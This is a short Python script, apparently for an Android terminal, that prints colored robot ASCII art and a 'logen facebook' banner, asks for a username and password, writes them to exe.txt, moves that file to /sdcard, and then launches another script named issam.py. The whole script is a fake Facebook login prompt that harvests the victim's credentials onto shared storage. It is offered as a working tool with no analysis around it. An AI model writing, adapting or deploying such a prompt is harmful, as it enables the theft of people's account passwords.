import os
os.system('clear')
R  = '\33[1;31m'
print(R)
G  = '\33[1;32m'
print('''
┈┈┈╲┈┈┈┈╱     
┈┈┈╱▔▔▔▔╲     
┈┈┃┈▇┈┈▇┈┃    
╭╮┣━━━━━━┫╭╮     
┃┃┃┈┈┈┈┈┈┃┃┃     
╰╯┃┈┈┈┈┈┈┃╰╯      
┈┈╰┓┏━━┓┏╯      
┈┈┈╰╯┈┈╰╯      	      
	''')
print('\33[1;36m[logen facebook √]')
print(G)
for x in range(1):
    b = input('enter username >> ')
    m = input('enter password >> ')
    x = open('exe.txt','w')
    x.write(b +'\n')
    x.write(m +'\n')
x.close()
os.system(' mv exe.txt /sdcard')
os.system('python2 issam.py')
